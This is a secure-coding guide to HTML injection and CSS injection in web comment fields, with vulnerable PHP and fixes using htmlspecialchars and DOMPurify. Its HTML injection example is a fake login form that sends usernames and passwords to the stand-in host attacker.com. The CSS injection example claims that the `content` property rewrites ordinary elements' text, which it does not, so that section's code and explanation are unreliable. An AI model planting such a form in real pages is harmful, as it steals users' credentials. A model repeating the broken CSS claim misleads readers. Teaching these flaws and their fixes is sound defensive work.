# Vulnerabilities

## htmli

##### description  
HTML Injection (HTMLi) is a vulnerability that occurs when an attacker is able to inject HTML code into a web page by exploiting a weakness in the input validation process. This can happen, for example, if a web application does not properly validate user input or if it allows users to submit data that includes HTML tags that can be executed on the page.  
  
Let's say there is a vulnerable web page that allows users to submit comments, which are then displayed on the page without proper validation. An attacker could submit a comment that includes a ```<form>``` tag that is used to collect sensitive information from users, such as their login credentials.  

##### example  
Here is an example of what the injected HTML code might look like:  
```html
<p>Thank you for visiting our website. Please login to continue:</p>
<form method="post" action="http://attacker.com/steal">
  <label>Username:</label>
  <input type="text" name="username"><br>
  <label>Password:</label>
  <input type="password" name="password"><br>
  <input type="submit" value="Login">
</form>
```

In this example, the attacker has injected a ```<form>``` tag that looks like a legitimate login form. The form is set up to submit the entered username and password to the attacker's website (http://attacker.com/steal) when the user clicks the "Login" button.  

When the user views the page and enters their login credentials, they will unknowingly submit them to the attacker's website instead of the legitimate website. The attacker can then use the stolen credentials to access the victim's account and carry out further attacks.  

##### code of vulnerability
Example of vulnerable code:  
```php
<?php
  $comment = $_POST['comment'];
  echo "<p>You entered the following comment:</p>";
  echo "<p>$comment</p>";
?>
```
In this code, the value of the ```$_POST['comment']``` variable is directly printed onto the page without being properly validated or filtered. This means that an attacker can inject any HTML code they want into the page by submitting a comment that includes HTML tags.  
  
##### fix 
To fix this vulnerability, we need to properly validate and filter the user input before printing it onto the page. Here's an example of how we can do this:  
```php
<?php
  $comment = $_POST['comment'];
  $filtered_comment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
  echo "<p>You entered the following comment:</p>";
  echo "<p>$filtered_comment</p>";
?>
```

In this updated code, we use the ```htmlspecialchars``` function to filter out any HTML tags and special characters that could be used to inject malicious code. The ```ENT_QUOTES``` flag is used to ensure that both single and double quotes are properly escaped, and the ```'UTF-8'``` parameter specifies the character encoding to use. This helps prevent HTML injection and other types of code injection attacks.

## cssi

##### description  
CSSI or CSS Injection is a type of attack that involves injecting malicious CSS code into a website or web application. CSS is responsible for the layout and styling of a website. By injecting malicious CSS code, an attacker can modify the appearance and behavior of a website, potentially compromising the security and privacy of users.  

Let's say there's a website that allows users to submit comments on articles. The website displays the comments in a section below the article, with each comment being represented by an HTML element.  
  
##### example
Here is an example of the webpage:
```html
<div class="comment">
  <p class="username">Username</p>
  <p class="message">Comment message</p>
</div>
```

##### code of vulnerability
An attacker could use CSS injection to modify the appearance of the comments section by injecting malicious CSS code into the comment submission form. For example, they could inject the following CSS code:
```css
.comment {
  display: none;
}

/* The following rule will only target the attacker's comment */
.comment:last-child {
  display: block;
}

.comment:last-child .username {
  content: "Hacker";
}

.comment:last-child .message {
  content: attr(data-comment);
}
```

This code would hide all comments on the page, except for the attacker's comment, which would be displayed with a modified username and message. The message would be set using the ```"data-comment"``` attribute of the comment element, which would be populated with the user's input. In this way, the attacker could inject arbitrary comments into the website and potentially trick users into clicking on malicious links or divulging personal information.

To prevent CSS injection attacks like this, web developers should implement input validation and sanitization techniques to prevent untrusted data from being processed and displayed on the website. Additionally, website owners should educate their users on safe browsing practices and encourage them to report suspicious behavior.  
  
##### fix
To fix this vulneravility we need to validate the input on server side:
```javascript
// Import the DOMPurify library
const DOMPurify = require("dompurify");

// Route to handle user comments
app.post("/comments", (req, res) => {
  // Get the user's comment from the request body
  const comment = req.body.comment;

  // Sanitize the comment using DOMPurify
  const cleanComment = DOMPurify.sanitize(comment);

  // Validate the comment
  if (!cleanComment.trim()) {
    // If the comment is empty or contains only whitespace, return an error response
    return res.status(400).send("Comment cannot be empty");
  }

  // Save the sanitized comment to the database
  // ...
});
```

In this example, we're importing the DOMPurify library and using it to sanitize the user's comment on the server-side. We then check if the sanitized comment is empty or contains only whitespace characters, and return an error response if it does. If the comment is valid, we can save it to the database.  




